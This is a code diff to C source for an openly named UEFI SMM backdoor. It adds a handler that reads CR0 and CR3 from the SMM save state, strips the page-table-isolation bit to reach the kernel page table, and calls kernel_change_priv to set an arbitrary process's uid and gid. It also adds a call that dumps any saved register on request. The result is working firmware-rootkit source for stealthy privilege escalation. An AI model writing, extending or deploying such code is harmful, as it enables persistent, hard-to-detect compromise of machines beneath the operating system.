@@ -4,16 +4,21 @@
 #include "Protocol/SmmCpu.h"
 #include "Protocol/SmmSwDispatch.h"
 #include "Protocol/SmmPeriodicTimerDispatch.h"
+#include "Uefi/UefiBaseType.h"
 #include "Universal/DisplayEngineDxe/FormDisplay.h"
 #include "efivars.h"
 #include "globals.h"
+#include "kernel.h"
 
 #include "ioctl.h"
+
+#define PAGE_SHIFT		12
+#define PTI_SWITCH_MASK         (1 << PAGE_SHIFT)
 
 static UINT64 gSmiInterval = 640000;
 static UINT64 gBackdoorWakeupPeriod = 1000000;
 
-static EFI_SMM_SYSTEM_TABLE* gStmt;
+EFI_SMM_SYSTEM_TABLE* gStmt;
 static EFI_SMM_BASE_PROTOCOL* gSmmBase;
 static EFI_SMM_SW_DISPATCH_PROTOCOL* gSwDispatch;
 static EFI_SMM_PERIODIC_TIMER_DISPATCH_PROTOCOL* gPeriodicTimer;
@@ -36,6 +41,8 @@ static const UINT64 BACKDOOR_CALL_REGISTERS[] = {
     EFI_SMM_SAVE_STATE_REGISTER_R9
 };
 
+struct ControlRegs gControlRegs; 
+
 static EFI_STATUS register_periodic_interrupt();
 static EFI_STATUS unregister_periodic_interrupt();
 
@@ -53,6 +60,12 @@ static void backdoor_write_params(struct BackdoorParams* params, UINT32 cpu) {
                     gSmmCpu, sizeof(params->r[i]), BACKDOOR_CALL_REGISTERS[i], cpu, (const void *) &params->r[i]
                 );
     }
+}
+
+static void backdoor_save_control_regs(UINT32 cpu) {
+    gSmmCpu->ReadSaveState(gSmmCpu, sizeof(UINT64), EFI_SMM_SAVE_STATE_REGISTER_CR0, cpu, &gControlRegs.Cr0);
+    gSmmCpu->ReadSaveState(gSmmCpu, sizeof(UINT64), EFI_SMM_SAVE_STATE_REGISTER_CR3, cpu, &gControlRegs.Cr3);
+    gControlRegs.Cr3Kernel = gControlRegs.Cr3 & (~PTI_SWITCH_MASK);
 }
 
 static BOOLEAN is_valid_request(struct BackdoorParams* params) {
@@ -77,6 +90,22 @@ static void backdoor_api_wakeup(struct BackdoorParams* params) {
     params->r[0] = register_periodic_interrupt();
 }
 
+static void backdoor_api_change_priv(struct BackdoorParams* params, UINT32 cpu) {
+    if (gStmt->CurrentlyExecutingCpu == cpu) {
+        UINT32 uid = params->r[1];
+        UINT32 gid = params->r[2];
+
+        backdoor_save_control_regs(cpu);
+        kernel_change_priv(uid, gid, params);
+    } else {
+        params->r[0] = EFI_INVALID_PARAMETER;
+    }
+}
+
+static void backdoor_api_dump_register(struct BackdoorParams* params, UINT32 cpu) {
+    params->r[0] = gSmmCpu->ReadSaveState(gSmmCpu, sizeof(params->r[1]), params->r[1], cpu, &params->r[1]);
+}
+
 static BOOLEAN handle_cpu_core(UINT32 cpu) {
     struct BackdoorParams params;
     backdoor_read_params(&params, cpu);
@@ -96,6 +125,15 @@ static BOOLEAN handle_cpu_core(UINT32 cpu) {
             case BACKDOOR_GET_CURRENT_CPU:
                 backdoor_api_get_current_cpu(&params);
                 break;
+
+            case BACKDOOR_CHANGE_PRIV:
+                backdoor_api_change_priv(&params, cpu);
+                break;
+
+            case BACKDOOR_DUMP_REG:
+                backdoor_api_dump_register(&params, cpu);
+                break;
+
         }
 
         backdoor_write_params(&params, cpu);
